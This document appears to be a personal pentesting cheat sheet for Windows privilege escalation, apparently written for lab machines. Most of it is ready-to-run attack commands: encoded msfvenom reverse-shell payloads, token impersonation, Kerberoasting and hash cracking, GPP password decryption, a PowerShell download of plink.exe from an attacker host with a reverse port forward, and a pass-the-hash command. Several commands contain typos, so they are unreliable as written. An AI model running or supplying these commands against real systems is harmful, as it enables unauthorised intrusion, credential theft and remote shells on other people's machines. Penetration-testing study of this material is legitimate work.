# Privesc

## PowerUp a powershell script

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

```
. .\PowerUp.ps1
Invoke-AllChecks
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.27.83 LPORT=4443 -e x86/sjikata -
f exe -o Advanced.exe
```

Encoded payload

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai
LHOST=10.11.9.134 LPORT=9091 -f exe -o bruce.exe
```

## Sherlock PowerShell script exploit suggester

Edit Sherlock.ps1 file and add line at the end.

```
...
Find-AllVulns
```

## Privilege Escalation Awesome Scripts SUITE

[GitHub - carlospolop/privilege-escalation-awesome-scripts-suite: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

## Additional reading

FuzzySecurity | Windows Privilege Escalation Fundamentals

[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)

Windows Privilege Escalation Guide

[Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

## Token Impersonation with Incognito

On a meterpreter shell load incognito

```
list_tokens -u
impersonate_toker token\\name
rev2self on meterpreter (reverts back to the initial permissions)
```

## Kerberoasting

Once we have user credentials we can retrieve services with administrator accounts

Using the GetUserSPNS.py (impacket)

```
GetUserSPNS.py domain.local/user:password -dc-ip 192.168.57.140 -request
```

Find hashcat hash type

```
hashcat --1 help | grep Kerberos
hashcat -m 13100 hashes4.txt rockyou.txt -O
```

## Abusing GPP

Find the Groups.xml file.
Retrieve the cpassword hash. Decrypt.

```
gpp-decrypt hash
```

## Port Forwarding

Download `plink.exe`

```
C:\Users\Alfred>powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8/plink.exe', 'plink.exe')"
```

Start SSH service on our attacking box.

```
root@kali:~# service ssh start
```

Run `plink.exe`

```
C:\Users\Alfred>plink.exe -l root -pw  -R 445:127.0.0.1:445 ATK_IP
```

Use `winexe` to get a shell

```
root@kali:~# winexe -U Administrator //127.0.0.1 "cmd.exe"
```

## Abusing Token Privileges For Windows Local Privilege Escalation

TODO: Good reads

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/


## Pass the hash attack

```
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //IP cmd.exe 
```